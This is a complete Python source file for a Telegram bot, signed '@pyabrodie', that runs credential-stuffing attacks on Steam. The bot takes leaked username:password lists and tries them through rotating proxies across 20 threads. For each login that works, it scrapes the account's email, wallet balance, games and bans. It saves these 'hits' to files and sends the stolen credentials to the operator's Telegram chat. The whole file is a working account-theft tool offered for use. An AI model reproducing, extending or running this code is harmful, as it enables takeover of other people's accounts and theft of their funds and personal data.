#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
STEAM CHECKER TELEGRAM BOT - Supports Text + File
"""

import os
import time
import asyncio
import logging
import re
import random
import base64
import threading
from pathlib import Path
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Config
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0").strip())

if not TELEGRAM_TOKEN or OWNER_ID == 0:
    raise ValueError("Set TELEGRAM_TOKEN and numeric OWNER_ID!")

MY_SIGNATURE = "@pyabrodie"
TELEGRAM_CHANNEL = "https://t.me/HoTmIlToOLs"

stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': 0, 'start_time': None}
lock = threading.Lock()

logging.basicConfig(level=logging.INFO)

# ====================== HELPERS ======================
def create_results_folder():
    Path("Results").mkdir(parents=True, exist_ok=True)

def save_hit(filename, data):
    filepath = os.path.join("Results", filename)
    if not os.path.exists(filepath):
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"# Created by {MY_SIGNATURE}\n\n")
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"{data}\n")

def shorten_games(games, limit=12):
    if not games: return "None"
    if len(games) > limit:
        return " | ".join(games[:limit]) + f" ... (+{len(games)-limit})"
    return " | ".join(games)

# ====================== CHECKER (from your original) ======================
def check_steam_account(combo, proxy_url=None):
    try:
        username, password = combo.strip().split(':', 1)
    except:
        return None

    user_clean = re.sub(r"@.*", "", username)
    session = requests.Session()
    session.verify = False
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://steamcommunity.com",
        "X-Requested-With": "XMLHttpRequest",
    }
    session.headers.update(headers)

    try:
        now = str(int(time.time()))
        r1 = session.post("https://steamcommunity.com/login/getrsakey/", 
                         data=f"donotcache={now}&username={user_clean}", timeout=12)
        j1 = r1.json()
        if not j1.get("success"):
            return None

        n = int(j1["publickey_mod"], 16)
        e = int(j1["publickey_exp"], 16)
        rsa_key = RSA.construct((n, e))
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted = cipher.encrypt(password.encode("utf-8"))
        pass3 = quote_plus(base64.b64encode(encrypted).decode())

        now2 = str(int(time.time()))
        payload = f"donotcache={now2}&password={pass3}&username={user_clean}&twofactorcode=&rsatimestamp={j1['timestamp']}&remember_login=false"

        r2 = session.post("https://steamcommunity.com/login/dologin/", data=payload, timeout=12)
        j2 = r2.json()
        if not j2.get("success"):
            return None

        # Cookies
        for cookie in r2.cookies:
            for d in [".steamcommunity.com", ".steampowered.com"]:
                session.cookies.set(cookie.name, cookie.value, domain=d)

        # Fetch details
        time.sleep(0.5)
        r_acc = session.get("https://store.steampowered.com/account/", timeout=15)
        email, balance, country = parse_account_page(r_acc.text)

        time.sleep(0.5)
        r_profile = session.get("https://steamcommunity.com/my/profile/", timeout=15)
        total_games, level, limited = parse_profile_page(r_profile.text)

        games = []
        if int(total_games or 0) > 0:
            time.sleep(0.5)
            r_games = session.get("https://steamcommunity.com/my/games/?tab=all", timeout=15)
            games = parse_games_page(r_games.text)

        vac = gban = cban = "Unknown"
        if "/profiles/" in r_profile.url:
            sid = r_profile.url.split("/profiles/")[1].strip("/")
            time.sleep(0.5)
            r_ban = session.get(f"https://steamcommunity.com/profiles/{sid}", timeout=15)
            vac, gban, cban = parse_ban_page(r_ban.text)

        return {
            "username": username, "password": password, "email": email,
            "balance": balance, "country": country, "total_games": total_games,
            "games": games, "level": level, "limited": limited,
            "vac_bans": vac, "game_bans": gban, "community_ban": cban
        }
    except:
        return None

# Parsers (from original)
def parse_account_page(html):
    email = balance = country = "Unknown"
    try:
        soup = BeautifulSoup(html, "html.parser")
        if e := soup.find("input", {"id": "account_name"}):
            email = e.get("value", "Unknown")
        if b := soup.find("a", {"id": "header_wallet_balance"}):
            balance = b.get_text(strip=True)
        if c := soup.find("select", {"id": "account_country"}):
            if opt := c.find("option", selected=True):
                country = opt.get_text(strip=True)
    except: pass
    return email, balance, country

def parse_profile_page(html):
    total = level = "0"
    limited = "No"
    try:
        soup = BeautifulSoup(html, "html.parser")
        if a := soup.find("a", href=re.compile(r"/games/")):
            if m := re.search(r'(\d+)', a.get_text() or ""):
                total = m.group(1)
        if "limited account" in html.lower():
            limited = "Yes"
    except: pass
    return total, level, limited

def parse_games_page(html):
    games = []
    try:
        soup = BeautifulSoup(html, "html.parser")
        for div in soup.find_all("div", class_="gameListRowItemName")[:25]:
            if t := div.get_text(strip=True):
                games.append(t)
    except: pass
    return games

def parse_ban_page(html):
    vac = gban = "0"
    cban = "No"
    try:
        if m := re.search(r'(\d+)\s*VAC', html, re.I): vac = m.group(1)
        if m := re.search(r'(\d+)\s*game ban', html, re.I): gban = m.group(1)
        if "community ban" in html.lower(): cban = "Yes"
    except: pass
    return vac, gban, cban

# ====================== PROCESS ======================
def process_account(combo, proxies, chat_id, bot):
    proxy = random.choice(proxies) if proxies else None
    result = check_steam_account(combo, proxy)

    if result:
        hit_line = f"{result['username']}:{result['password']}"
        save_hit("All_Hits.txt", hit_line)
        if result['email'] != "Unknown":
            save_hit("Valid_With_Email.txt", f"{hit_line}\n{result['email']}:{result['password']}")
        else:
            save_hit("Valid_Without_Email.txt", hit_line)

        games_str = shorten_games(result['games'])
        msg = f"""✅ <b>STEAM HIT FOUND</b>

🔑 <code>{result['username']}:{result['password']}</code>
💰 Balance: {result['balance']}
🌍 Country: {result['country']}
🎮 Games: {result['total_games']} ({games_str})
📊 Level: {result['level']} | Limited: {result['limited']}
🚫 Bans: VAC:{result['vac_bans']} | Game:{result['game_bans']} | Comm:{result['community_ban']}
📧 Email: {result['email']}

💎 {MY_SIGNATURE}"""

        try:
            asyncio.run(bot.send_message(chat_id, msg, parse_mode=ParseMode.HTML))
        except: pass

        with lock:
            stats['valid'] += 1
    else:
        with lock:
            stats['invalid'] += 1

    with lock:
        stats['checked'] += 1

async def run_checker(combos, proxies, chat_id, bot):
    global stats
    with lock:
        stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': len(combos), 'start_time': time.time()}

    create_results_folder()

    async def progress():
        while stats['checked'] < stats['total']:
            await asyncio.sleep(8)
            with lock:
                await bot.send_message(chat_id, f"🔄 Progress: {stats['checked']}/{stats['total']} | Valid: {stats['valid']}")

    asyncio.create_task(progress())

    with ThreadPoolExecutor(max_workers=20) as executor:
        for combo in combos:
            executor.submit(process_account, combo, proxies, chat_id, bot)

    with lock:
        elapsed = int(time.time() - stats['start_time'])
        summary = f"""✅ <b>SCAN COMPLETE</b>

⏱️ Time: {elapsed//60}m {elapsed%60}s
✅ Valid: {stats['valid']}
❌ Invalid: {stats['invalid']}
📊 Total: {stats['total']}

💎 {MY_SIGNATURE}"""

    await bot.send_message(chat_id, summary, parse_mode=ParseMode.HTML)

    for fname in ["All_Hits.txt", "Valid_With_Email.txt", "Valid_Without_Email.txt"]:
        p = os.path.join("Results", fname)
        if os.path.exists(p) and os.path.getsize(p) > 50:
            await bot.send_document(chat_id, open(p, 'rb'), caption=fname)

# ====================== HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    await update.message.reply_text(
        "🤖 <b>Steam Checker Bot Ready</b>\n\n"
        "You can:\n"
        "• Send combo as text message (one per line)\n"
        "• Upload .txt file\n"
        "• Send proxies.txt\n"
        "/status", parse_mode=ParseMode.HTML)

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    with lock:
        if stats['total'] == 0:
            await update.message.reply_text("No scan running.")
            return
        elapsed = int(time.time() - stats['start_time'])
        await update.message.reply_text(
            f"📊 Checked: {stats['checked']}/{stats['total']}\nValid: {stats['valid']}", 
            parse_mode=ParseMode.HTML)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    text = update.message.text.strip()
    if not text or ':' not in text:
        return

    combos = [line.strip() for line in text.split('\n') if ':' in line.strip()]
    if not combos:
        return

    await update.message.reply_text(f"✅ Received {len(combos)} combos from text. Starting check...")

    proxies = context.user_data.get('proxies', [])
    asyncio.create_task(run_checker(combos, proxies, update.effective_chat.id, context.bot))

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("Only .txt files!")
        return

    await update.message.reply_text(f"📥 Received file: {doc.file_name}")
    file = await doc.get_file()
    path = f"/tmp/{doc.file_name}"
    await file.download_to_drive(path)

    if "proxy" in doc.file_name.lower():
        with open(path, encoding='utf-8', errors='ignore') as f:
            proxies = [line.strip() for line in f if line.strip()]
        context.user_data['proxies'] = proxies
        await update.message.reply_text(f"✅ Loaded {len(proxies)} proxies.")
        return

    with open(path, encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip()]

    await update.message.reply_text(f"✅ Loaded {len(combos)} accounts from file. Starting...")

    proxies = context.user_data.get('proxies', [])
    asyncio.create_task(run_checker(combos, proxies, update.effective_chat.id, context.bot))

# ====================== MAIN ======================
def main():
    create_results_folder()
    app = Application.builder().token(TELEGRAM_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))

    print("🚀 Steam Checker Bot Started - Supports Text + File")
    app.run_polling()

if __name__ == "__main__":
    main()
